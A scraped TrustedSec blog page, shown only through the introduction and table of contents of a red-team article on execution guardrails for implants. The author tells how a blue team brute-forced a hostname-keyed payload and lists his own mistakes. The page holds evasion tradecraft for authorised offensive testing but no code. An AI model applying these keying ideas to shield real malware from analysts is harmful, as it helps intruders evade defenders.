# https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure

<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
  <body class="mx-auto lang-en section-blog type-blog antialiased overscroll-none"><div class="cky-hide cky-overlay"></div><div class="cky-btn-revisit-wrapper cky-revisit-hide cky-revisit-bottom-left" data-cky-tag="revisit-consent" data-tooltip="Consent Preferences" style="background-color: #000000;"><button aria-label="Consent Preferences" class="cky-btn-revisit"><img alt="Revisit consent button" src="https://cdn-cookieyes.com/assets/images/revisit.svg"></button></div><div class="cky-consent-container cky-box-bottom-left" aria-label="We value your privacy" role="region" tabindex="0"><div class="cky-consent-bar" data-cky-tag="notice" style="border-color: #EDF1F4; background-color: #EDF1F4;"><div class="cky-notice"><p class="cky-title" aria-level="1" data-cky-tag="title" role="heading" style="color: #212121;">We value your privacy</p><div class="cky-notice-group"><div class="cky-notice-des" data-cky-tag="description" style="color: #212121;"><p>We use cookies to enhance your browsing experience, serve personalised ads or content, and analyse our traffic. By clicking "Accept All", you consent to our use of cookies.</p></div><div class="cky-notice-btn-wrapper" data-cky-tag="notice-buttons"><button class="cky-btn cky-btn-customize" aria-label="Customise" data-cky-tag="settings-button" style="color: #000000; border-color: #000000; background-color: #EDF1F4;">Customise</button> <button class="cky-btn cky-btn-reject" aria-label="Reject All" data-cky-tag="reject-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Reject All</button> <button class="cky-btn cky-btn-accept" aria-label="Accept All" data-cky-tag="accept-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Accept All</button> </div></div></div></div></div><div class="cky-modal" tabindex="0"><div class="cky-preference-center" data-cky-tag="detail" aria-label="Customise Consent Preferences" aria-modal="true" role="dialog" style="color: #212121; border-color: #EDF1F4; background-color: #EDF1F4;"><div class="cky-preference-header"><span class="cky-preference-title" aria-level="1" data-cky-tag="detail-title" role="heading" style="color: #212121;">Customise Consent Preferences</span> <button aria-label="Close" class="cky-btn-close" data-cky-tag="detail-close"><img alt="Close" src="https://cdn-cookieyes.com/assets/images/close.svg" width="10" height="10"></button></div><div class="cky-preference-body-wrapper"><div class="cky-preference-content-wrapper" data-cky-tag="detail-description" style="color: #212121;"><p>We use cookies to help you navigate efficiently and perform certain functions. You will find detailed information about all cookies under each consent category below.</p><p>The cookies that are categorised as "Necessary" are stored on your browser as they are essential for enabling the basic functionalities of the site. ...&nbsp;<button class="cky-show-desc-btn" data-cky-tag="show-desc-button" aria-label="Show more">Show more</button></p></div><div class="cky-horizontal-separator"></div><div class="cky-accordion-wrapper" data-cky-tag="detail-categories"><div class="cky-accordion" id="ckyDetailCategorynecessary"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategorynecessaryBody" aria-label="Necessary" data-cky-tag="detail-category-title" style="color: #212121;">Necessary</button><span class="cky-always-active" data-cky-tag="always-active">Always Active</span></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Necessary cookies are required to enable the basic features of this site, such as providing secure log-in or adjusting your consent preferences. These cookies do not store any personally identifiable data.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategorynecessaryBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>__cf_bm</div></li><li><div>Duration</div><div>1 hour</div></li><li><div>Description</div><div>This cookie, set by Cloudflare, is used to support Cloudflare Bot Management. </div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>__hssrc</div></li><li><div>Duration</div><div>session</div></li><li><div>Description</div><div>This cookie is set by Hubspot whenever it changes the session cookie. The __hssrc cookie set to 1 indicates that the user has restarted the browser, and if the cookie does not exist, it is assumed to be a new session.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>__hssc</div></li><li><div>Duration</div><div>1 hour</div></li><li><div>Description</div><div>HubSpot sets this cookie to keep track of sessions and to determine if HubSpot should increment the session number and timestamps in the __hstc cookie.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>_cfuvid</div></li><li><div>Duration</div><div>session</div></li><li><div>Description</div><div>Calendly sets this cookie to track users across sessions to optimize user experience by maintaining session consistency and providing personalized services</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryfunctional"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryfunctionalBody" aria-label="Functional" data-cky-tag="detail-category-title" style="color: #212121;">Functional</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchfunctional" aria-label="Enable Functional" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Functional cookies help perform certain functionalities like sharing the content of the website on social media platforms, collecting feedback, and other third-party features.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryfunctionalBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>lidc</div></li><li><div>Duration</div><div>1 day</div></li><li><div>Description</div><div>LinkedIn sets the lidc cookie to facilitate data center selection.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>li_gc</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>Linkedin set this cookie for storing visitor's consent regarding using cookies for non-essential purposes.</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryanalytics"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryanalyticsBody" aria-label="Analytics" data-cky-tag="detail-category-title" style="color: #212121;">Analytics</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchanalytics" aria-label="Enable Analytics" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Analytical cookies are used to understand how visitors interact with the website. These cookies help provide information on metrics such as the number of visitors, bounce rate, traffic source, etc.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryanalyticsBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>_gcl_au</div></li><li><div>Duration</div><div>3 months</div></li><li><div>Description</div><div>Google Tag Manager sets the cookie to experiment advertisement efficiency of websites using their services.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>_ga_*</div></li><li><div>Duration</div><div>1 year 1 month 4 days</div></li><li><div>Description</div><div>Google Analytics sets this cookie to store and count page views.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>_ga</div></li><li><div>Duration</div><div>1 year 1 month 4 days</div></li><li><div>Description</div><div>Google Analytics sets this cookie to calculate visitor, session and campaign data and track site usage for the site's analytics report. The cookie stores information anonymously and assigns a randomly generated number to recognise unique visitors.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>__hstc</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>Hubspot set this main cookie for tracking visitors. It contains the domain, initial timestamp (first visit), last timestamp (last visit), current timestamp (this visit), and session number (increments for each subsequent session).</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>hubspotutk</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>HubSpot sets this cookie to keep track of the visitors to the website. This cookie is passed to HubSpot on form submission and used when deduplicating contacts.</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryperformance"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryperformanceBody" aria-label="Performance" data-cky-tag="detail-category-title" style="color: #212121;">Performance</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchperformance" aria-label="Enable Performance" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Performance cookies are used to understand and analyse the key performance indexes of the website which helps in delivering a better user experience for the visitors.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryperformanceBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>session_id</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>This cookie is used to get or set the session id for the current session.</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryadvertisement"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryadvertisementBody" aria-label="Advertisement" data-cky-tag="detail-category-title" style="color: #212121;">Advertisement</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchadvertisement" aria-label="Enable Advertisement" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Advertisement cookies are used to provide visitors with customised advertisements based on the pages you visited previously and to analyse the effectiveness of the ad campaigns.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryadvertisementBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>sa-user-id</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>StackAdapt sets this cookie as a third party advertising cookie to record information about a user's website activity, such as the pages visited and the locations viewed, to enable us to provide users with interest-based content and personalised advertisements on external websites.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>sa-user-id-v2</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>StackAdapt sets this cookie as a third party advertising cookie to record information about a user's website activity, such as the pages visited and the locations viewed, to enable us to provide users with interest-based content and personalised advertisements on external websites.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>bcookie</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>LinkedIn sets this cookie from LinkedIn share buttons and ad tags to recognize browser IDs.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>IDE</div></li><li><div>Duration</div><div>1 year 24 days</div></li><li><div>Description</div><div>Google DoubleClick IDE cookies store information about how the user uses the website to present them with relevant ads according to the user profile.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>test_cookie</div></li><li><div>Duration</div><div>15 minutes</div></li><li><div>Description</div><div>doubleclick.net sets this cookie to determine if the user's browser supports cookies.</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryother"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryotherBody" aria-label="Uncategorised" data-cky-tag="detail-category-title" style="color: #212121;">Uncategorised</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchother" aria-label="Enable Uncategorised" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Other uncategorised cookies are those that are being analysed and have not been classified into a category as yet.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryotherBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>sa-user-id-v3</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>Description is currently not available.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>calltrk_nearest_tld</div></li><li><div>Duration</div><div>1 year 1 month 4 days</div></li><li><div>Description</div><div>Description is currently not available.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>calltrk_referrer</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>This is a functionality cookie set by the CallRail. This cookie is used to store the referring URL. It helps to accurately attribute the visitor source when displaying a tracking phone number.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>calltrk_landing</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>This is a functionality cookie set by the CallRail. This cookie is used to store the landing page URL. It helps to accurately attribute the visitor source when displaying a tracking phone number.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>frontend_lang</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>No description available.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>libsyn-paywall-s</div></li><li><div>Duration</div><div>1 day</div></li><li><div>Description</div><div>Description is currently not available.</div></li></ul></div></div></div></div></div><div class="cky-footer-wrapper"><span class="cky-footer-shadow" style="background: linear-gradient(180deg, rgba(255, 255, 255, 0) 0%, #EDF1F4 100%);"></span><div class="cky-prefrence-btn-wrapper" data-cky-tag="detail-buttons"><button aria-label="Reject All" class="cky-btn cky-btn-reject" data-cky-tag="detail-reject-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Reject All</button> <button aria-label="Save My Preferences" class="cky-btn cky-btn-preferences" data-cky-tag="detail-save-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Save My Preferences</button> <button aria-label="Accept All" class="cky-btn cky-btn-accept" data-cky-tag="detail-accept-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Accept All</button></div><div data-cky-tag="detail-powered-by" style="padding: 8px 24px; font-size: 12px; font-weight: 400; line-height: 20px; text-align: right; border-radius: 0 0 6px 6px; direction: ltr; display: flex; justify-content: flex-end; align-items: center; color: #293C5B; background-color: #EDEDED;">Powered by <a href="https://www.cookieyes.com/product/cookie-consent/?ref=cypbcyb&amp;utm_source=cookie-banner&amp;utm_medium=powered-by-cookieyes" rel="noopener" style="margin-left:5px;line-height:0" target="_blank"><img alt="Cookieyes logo" src="https://cdn-cookieyes.com/assets/images/poweredbtcky.svg" style="width:78px;height:13px;margin:0" width="78" height="13"></a></div></div></div></div>


	

    

<!-- Global Header -->

<!-- End Global Header -->
		<main id="main" class="main overflow-x-hidden">

			

   



<section class="c-page-header relative bg-code text-white">

    <div class="px-p24 mq768:px-p48 mq1024:px-p56 c-header-wrap v-blog-header">
    <div class="max-w-p1440 mx-auto">
      <div class="flex flex-col mq768:flex-row">
        <div class="flex relative z-20 items-center mq768:w-1/2 order-1 py-p48 mq1024:py-p56 mq768:pr-p64 mq1024:pr-p56">

          <div class="w-full">

            

  
<ul class="mb-p64 mq1024:mb-p80 flex flex-wrap text-white">
                <li class="after:content-['/'] last:after:hidden after:mx-p8"><a class="text-sm hover:underline focus:underline" href="https://trustedsec.com/blog">Blog</a></li>
            <li class="after:content-['/'] last:after:hidden after:mx-p8"><a class="text-sm hover:underline focus:underline" href="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure">Execution Guardrails: No One Likes Unintentional Exposure</a></li>
     </ul>
                        <div class="mb-p32">

                              <div class="mb-p16">
                  <span class="font-mono text-sm">August 06, 2024</span>
                </div>
              
                                                                <h1 class="text-h1 mq1280:text-title-xl">Execution Guardrails: No One Likes Unintentional Exposure</h1>
                              
                                        </div>

                          <div class="mb-p16">
                <span class="text-h3 inline-block">
                  Written by
                                                            Brandon McGrath
                                                      </span>
              </div>
            


            
            
            
            <div class="mt-p64">
                              <span class="c-tag inline-block py-p6 px-p4 border border-gibson rounded-p6 text-gibson text-bd mr-p12 mb-p12 whitespace-nowrap">Red Team Adversarial Attack Simulation</span>
                          </div>
          </div>
        </div>

        <div class="mq768:flex overflow-hidden items-center mq768:justify-end mq768:w-paired-img max-w-p1080 -mx-p24 mq768:mx-none order-2 mq768:absolute inset-y-0 left-paired-img-plus fx" x-data="" x-fx.left.1200="2rem" style="transform: translate3d(-2rem, 0px, 0px); transition-duration: 1.2s;">
          <div class="relative mq768:static mq768:w-full h-full pt-full -mx-p24 mq768:mx-none">
                          <picture class=" w-full"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ExecutionGuardrails_WebHero.jpg?w=600&amp;h=600&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767063810&amp;s=eb143907511b8a8fcd4660821399cc87, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ExecutionGuardrails_WebHero.jpg?w=900&amp;h=900&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767063810&amp;s=a30a56a62749d6df3c5e685f00694cee 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ExecutionGuardrails_WebHero.jpg?w=600&amp;h=600&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767063810&amp;s=6fcb441819aecb92fd65735280acb07d, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ExecutionGuardrails_WebHero.jpg?w=900&amp;h=900&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767063810&amp;s=626ca0201d20557fb7960ad6c3586620 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ExecutionGuardrails_WebHero.jpg?w=320&amp;h=320&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767063810&amp;s=9569466cdb1b3c8e3750daba14b33e0f, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ExecutionGuardrails_WebHero.jpg?w=480&amp;h=480&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767063810&amp;s=5fec3f45d5efcf91595e28d589a0de01 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ExecutionGuardrails_WebHero.jpg?w=320&amp;h=320&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767063810&amp;s=efa52c9994ba8159ba2da230b92bddd9, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ExecutionGuardrails_WebHero.jpg?w=480&amp;h=480&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767063810&amp;s=156b02589d89acc556ea7e89ed6cb6f3 1.5x"><img class="c-img opacity-0 transition-all duration-300 absolute inset-0 object-cover w-full h-full object-center" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ExecutionGuardrails_WebHero.jpg?w=320&amp;h=320&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767063810&amp;s=efa52c9994ba8159ba2da230b92bddd9" loading="eager" x-data="image({mq1024:{width:600,height:600},DEFAULT:{width:320,height:320}})" :width="getSize()" :height="getSize('height')" alt="" width="600" height="600" style="opacity: 1;"></picture>                      </div>
        </div>
      </div>
    </div>
  </div>

</section>


      
			
						<div class="relative"><section id="contentWell-0" class="c-module relative bg-white text-black py-p64 mq768:py-p96" data-module-num="1" style="z-index: 0;"><div class="px-p24 mq768:px-p48 mq1024:px-p56"><div class="max-w-p1440 mx-auto"><div class="flex flex-col mq1024:flex-row" x-data="{ mobile: ! $breakpoint('mq1024') }" @resize.window="mobile = ! $breakpoint('mq1024')"><div class="mq1024:w-p320 mq1024:pr-p64 grow-0 shrink-0 mq1024:order-1"><div class="pb-p56 border-b mb-p56 mq1024:pb-none mq1024:border-none mq1024:mb-none"><p class="text-xs font-mono mb-p24">Table of contents</p><ul><li class="mb-p16 last:mb-none"><a href="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure#Introduction" class="text-h3 hover:underline focus:underline">1.1&nbsp;Introduction</a></li><li class="mb-p16 last:mb-none"><a href="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure#Process" class="text-h3 hover:underline focus:underline">1.2&nbsp;The Multi-Step Process</a></li><li class="mb-p16 last:mb-none"><a href="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure#Local" class="text-h3 hover:underline focus:underline">1.3&nbsp;Local Machine</a></li><li class="mb-p16 last:mb-none"><a href="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure#Network" class="text-h3 hover:underline focus:underline">1.4&nbsp;Network Keying</a></li><li class="mb-p16 last:mb-none"><a href="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure#External" class="text-h3 hover:underline focus:underline">1.5&nbsp;External Resources</a></li><li class="mb-p16 last:mb-none"><a href="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure#Payload" class="text-h3 hover:underline focus:underline">1.6&nbsp;Payload Design</a></li><li class="mb-p16 last:mb-none"><a href="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure#Conclusion" class="text-h3 hover:underline focus:underline">1.7&nbsp;Conclusion</a></li></ul></div><div><div class="w-full"><p id="share-label" class="text-xs font-mono mb-p16">Share</p><ul id="share-icons" class="flex items-center" aria-describedby="share-label"><li class="ml-p12"><a href="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure" target="_blank" title="Share URL" data-target="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-share"></use></svg></span><span class="sr-only">Share URL</span></a></li><li class="ml-p12"><a href="mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&amp;body=Execution%20Guardrails%3A%20No%20One%20Likes%20Unintentional%20Exposure%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fexecution-guardrails-no-one-likes-unintentional-exposure" target="_blank" title="Share via Email" data-target="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-email"></use></svg></span><span class="sr-only">Share via Email</span></a></li><li class="ml-p12"><a href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fexecution-guardrails-no-one-likes-unintentional-exposure" target="_blank" title="Share on Facebook" data-target="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-facebook"></use></svg></span><span class="sr-only">Share on Facebook</span></a></li><li class="ml-p12"><a href="http://twitter.com/share?text=Execution%20Guardrails%3A%20No%20One%20Likes%20Unintentional%20Exposure%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fexecution-guardrails-no-one-likes-unintentional-exposure" title="Share on X" rel="nofollow" data-target="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-twitter"></use></svg></span><span class="sr-only">Share on X</span></a></li><li class="ml-p12"><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fexecution-guardrails-no-one-likes-unintentional-exposure&amp;mini=true" target="_blank" title="Share on LinkedIn" data-target="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-linkedin"></use></svg></span><span class="sr-only">Share on LinkedIn</span></a></li></ul></div></div><div><div class="w-full"><p id="share-label" class="text-xs font-mono mb-p16">Share</p><ul id="share-icons" class="flex items-center" aria-describedby="share-label"><li class="ml-p12"><a href="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure" target="_blank" title="Share URL" data-target="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-share"></use></svg></span><span class="sr-only">Share URL</span></a></li><li class="ml-p12"><a href="mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&amp;body=Execution%20Guardrails%3A%20No%20One%20Likes%20Unintentional%20Exposure%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fexecution-guardrails-no-one-likes-unintentional-exposure" target="_blank" title="Share via Email" data-target="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-email"></use></svg></span><span class="sr-only">Share via Email</span></a></li><li class="ml-p12"><a href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fexecution-guardrails-no-one-likes-unintentional-exposure" target="_blank" title="Share on Facebook" data-target="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-facebook"></use></svg></span><span class="sr-only">Share on Facebook</span></a></li><li class="ml-p12"><a href="http://twitter.com/share?text=Execution%20Guardrails%3A%20No%20One%20Likes%20Unintentional%20Exposure%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fexecution-guardrails-no-one-likes-unintentional-exposure" title="Share on X" rel="nofollow" data-target="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-twitter"></use></svg></span><span class="sr-only">Share on X</span></a></li><li class="ml-p12"><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fexecution-guardrails-no-one-likes-unintentional-exposure&amp;mini=true" target="_blank" title="Share on LinkedIn" data-target="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-linkedin"></use></svg></span><span class="sr-only">Share on LinkedIn</span></a></li></ul></div></div></div><div class="w-full mq1024:w-content-well mq1024:order-2 flex-1"><div class="c-content"><h2 id="Introduction">1.1&nbsp;Introduction</h2><p class="MsoNormal">A hopefully rare scenario that gives red teamers a mini heart-attack is a sudden check-in from a new agent: <span><strong><em>admin</em></strong></span> on <span><strong><em>ALICE-PC</em></strong></span>.</p><p class="MsoNormal">If a blue teamer has managed to get hold of a payload used on an engagement and is able to unravel it to reveal the inner implant, then something has gone awfully wrong somewhere. In this post, I will review how an engagement went awfully wrong for me by expanding on this concept and looking at the laziness behind it.</p><p class="MsoNormal">In my case, I had access to a VDI for an assumed breach and generated a like-for-like key on the hostname—let’s called it <span><strong><em>WORKSTATION1</em></strong></span>. At some point during the engagement, I tripped an alarm unrelated to the implant itself and caused the blue team to track down <span><strong><em>WORKSTATION1</em></strong></span>. After some time, they managed to identify the implant process and took it offline. A few days later, I saw the <span><strong><em>admin@ALICE-PC</em></strong></span> check-in to my C2. So then, I immediately panicked and cycled all IPs, set up new listeners with new redirectors, and carried on. But, after speaking with the blue teamer who unraveled it, they said that all they did was gather a bunch of environmental components and just did some brute-forcing until they managed to fire off the payload.</p><p class="MsoNormal">On my side, all I had done was use a hostname key with SHA256 (<span><strong><em>265a787c97f61f963efe6d397ef712eef1b89f0641003d1664d118d123828379</em></strong></span>) to enter the execution cycle and then derived a new encryption key from the SHA256 value to decrypt the actual payload. In this instance, the implant was embedded within the payload using whatever transformations I applied.</p><p class="MsoNormal">I made several mistakes here:</p><ol start="1"><li>Having easy access to the VDI made me lower my guard/paranoia</li><li>Used a single key</li><li>Used an embedded payload</li></ol><p class="MsoNormal">Points 2 and 3 above are directly fueled by point 1 because it’s not something I typically do. Alas, here we are.</p><p class="MsoNormal">In this blog, I want to discuss how these mistakes can be avoided by using a collection of different keying variations and mechanisms. The code shown in this blog is merely an example/proof of concept and will have OpSec considerations—this is purely to demonstrate the ideas and methodology.</p><h2 id="Process">1.2&nbsp;The Multi-Step Process</h2><p class="MsoNormal">The diagram below shows the flow of keying that will be discussed in this blog.</p><div class="my-p56 flex justify-center text-center"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig1_McGrath.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828805&amp;s=905bcbfeae1a4f841ae43c42876ed33b, 